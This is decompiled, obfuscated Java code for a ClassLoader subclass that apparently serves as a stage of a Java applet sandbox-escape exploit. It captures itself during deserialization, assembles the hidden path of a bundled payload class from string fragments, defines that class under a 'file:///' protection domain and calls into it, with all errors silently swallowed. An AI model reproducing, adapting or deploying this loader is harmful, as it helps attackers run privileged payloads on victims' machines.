// 
// Decompiled by Procyon v0.5.30
// 

package zzz.ttt;

import java.io.InputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class a13d8 extends ClassLoader implements Serializable
{
    private static final long serialVersionUID = 6812622870313961944L;
    public static a13d8 extrn;
    public static String test;
    
    private void writeObject(final ObjectOutputStream objectOutputStream) throws IOException, ClassNotFoundException {
        objectOutputStream.defaultWriteObject();
    }
    
    private void readObject(final ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException {
        a13d8.extrn = this;
        objectInputStream.defaultReadObject();
    }
    
    public void bRP(final String s, final String s2) throws IOException {
        try {
            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            final byte[] array = new byte[8192];
            final String s3 = "/a150";
            final String s4 = "lass";
            final String s5 = "z";
            final String s6 = "t";
            final InputStream resourceAsStream = this.getClass().getResourceAsStream(s3.substring(0, 1) + s5 + s5 + s5 + s3.substring(0, 1) + s6 + s6 + s6 + s3 + "0b0.c" + s4);
            String string = "";
            int read;
            while ((read = resourceAsStream.read(array)) > 0) {
                final String string2 = string + "/";
                string = string2 + string2 + string2;
                byteArrayOutputStream.write(array, 0, read);
            }
            final String s7 = "gfilar:st/";
            final byte[] byteArray = byteArrayOutputStream.toByteArray();
            final Class<?> defineClass = this.defineClass("zzz.ttt.a1500b0", byteArray, 0, byteArray.length, ad3740b4.tst2(s7.substring(1, 4) + "e" + s7.substring(6, 7) + string.substring(0, 3)));
            final String s8 = "zatv";
            if (defineClass != null) {
                ad3740b4.tst(defineClass, s8, s);
            }
        }
        catch (Exception ex) {}
    }
    
    static {
        a13d8.extrn = null;
        a13d8.test = "";
    }
}
